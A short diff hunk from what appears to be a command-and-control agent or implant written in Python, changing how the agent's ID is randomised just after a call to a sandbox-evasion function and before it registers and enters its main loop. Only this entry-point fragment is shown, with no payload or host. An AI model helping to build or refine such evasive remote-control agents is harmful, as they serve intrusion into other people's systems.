@@ -292,7 +292,7 @@ if __name__ == '__main__':
         sandbox_evasion()
         print('[+] Agent running')
 
-        agent_id = randrange(500)
+        agent_id = random.randrange(1000, 9999)
         register()
 
         while True:
